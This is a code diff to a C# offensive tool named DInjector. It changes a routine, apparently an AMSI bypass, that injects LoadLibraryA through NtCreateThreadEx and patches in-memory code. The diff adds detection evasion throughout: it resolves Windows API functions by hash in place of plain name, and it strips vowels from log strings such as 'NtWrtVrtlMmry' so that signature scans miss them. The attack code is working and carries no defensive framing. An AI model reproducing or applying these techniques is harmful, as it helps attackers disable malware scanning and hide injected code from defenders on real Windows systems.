@@ -39,7 +39,7 @@ namespace DInjector
                 var funcAddress = IntPtr.Zero;
                 try
                 {
-                    funcAddress = DI.DynamicInvoke.Generic.GetLibraryAddress(libName, funcName, CanLoadFromDisk: force);
+                    funcAddress = DI.DynamicInvoke.Generic.GetLibraryAddress(libName, DI.DynamicInvoke.Generic.GetAPIHash(funcName, 0x31337), 0x31337, CanLoadFromDisk: force);
                 }
                 catch (Exception e)
                 {
@@ -57,7 +57,7 @@ namespace DInjector
 
                     if (force)
                     {
-                        var loadLibraryAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "LoadLibraryA");
+                        var loadLibraryAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "84393dafba020d85614f9c4c81bc7b42", 0x31337);
 
                         #region NtAllocateVirtualMemory (bLibName, PAGE_READWRITE)
 
@@ -74,9 +74,9 @@ namespace DInjector
                             DI.Data.Win32.WinNT.PAGE_READWRITE);
 
                         if (ntstatus == NTSTATUS.Success)
-                            Console.WriteLine($"(AM51|force:{force}) [+] NtAllocateVirtualMemory (bLibNameLength), PAGE_READWRITE");
+                            Console.WriteLine($"(AM51|force:{force}) [+] NtAllctVrtlMmry (bLibNameLength), PAGE_READWRITE");
                         else
-                            throw new Exception($"(AM51|force:{force}) [-] NtAllocateVirtualMemory (bLibNameLength), PAGE_READWRITE: {ntstatus}");
+                            throw new Exception($"(AM51|force:{force}) [-] NtAllctVrtlMmry (bLibNameLength), PAGE_READWRITE: {ntstatus}");
 
                         #endregion
 
@@ -95,9 +95,9 @@ namespace DInjector
                             ref bytesWritten);
 
                         if (ntstatus == NTSTATUS.Success)
-                            Console.WriteLine($"(AM51|force:{force}) [+] NtWriteVirtualMemory, bLibName");
+                            Console.WriteLine($"(AM51|force:{force}) [+] NtWrtVrtlMmry, bLibName");
                         else
-                            throw new Exception($"(AM51|force:{force}) [-] NtWriteVirtualMemory, bLibName: {ntstatus}");
+                            throw new Exception($"(AM51|force:{force}) [-] NtWrtVrtlMmry, bLibName: {ntstatus}");
 
                         Marshal.FreeHGlobal(buffer);
 
@@ -121,9 +121,9 @@ namespace DInjector
                             IntPtr.Zero);
 
                         if (ntstatus == NTSTATUS.Success)
-                            Console.WriteLine($"(AM51|force:{force}) [+] NtCreateThreadEx, LoadLibraryA");
+                            Console.WriteLine($"(AM51|force:{force}) [+] NtCrtThrdEx, LoadLibraryA");
                         else
-                            throw new Exception($"(AM51|force:{force}) [-] NtCreateThreadEx, LoadLibraryA: {ntstatus}");
+                            throw new Exception($"(AM51|force:{force}) [-] NtCrtThrdEx, LoadLibraryA: {ntstatus}");
 
                         System.Threading.Thread.Sleep(2000); // sleep till the DLL loads
 
@@ -165,9 +165,9 @@ namespace DInjector
                     ref oldProtect);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine($"(AM51|force:{force}) [+] NtProtectVirtualMemory, PAGE_READWRITE");
+                    Console.WriteLine($"(AM51|force:{force}) [+] NtPrtctVrtlMmry, PAGE_READWRITE");
                 else
-                    throw new Exception($"(AM51|force:{force}) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");
+                    throw new Exception($"(AM51|force:{force}) [-] NtPrtctVrtlMmry, PAGE_READWRITE: {ntstatus}");
 
                 #endregion
 
@@ -189,9 +189,9 @@ namespace DInjector
                         ref bytesWritten);
 
                     if (ntstatus == NTSTATUS.Success)
-                        Console.WriteLine($"(AM51|force:{force}) [+] NtWriteVirtualMemory, patch");
+                        Console.WriteLine($"(AM51|force:{force}) [+] NtWrtVrtlMmry, patch");
                     else
-                        throw new Exception($"(AM51|force:{force}) [-] NtWriteVirtualMemory, patch: {ntstatus}");
+                        throw new Exception($"(AM51|force:{force}) [-] NtWrtVrtlMmry, patch: {ntstatus}");
 
                     Marshal.FreeHGlobal(buffer);
 
@@ -216,9 +216,9 @@ namespace DInjector
                     ref tmpProtect);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine($"(AM51|force:{force}) [+] NtProtectVirtualMemory, oldProtect");
+                    Console.WriteLine($"(AM51|force:{force}) [+] NtPrtctVrtlMmry, oldProtect");
                 else
-                    throw new Exception($"(AM51|force:{force}) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
+                    throw new Exception($"(AM51|force:{force}) [-] NtPrtctVrtlMmry, oldProtect: {ntstatus}");
 
                 #endregion
             }
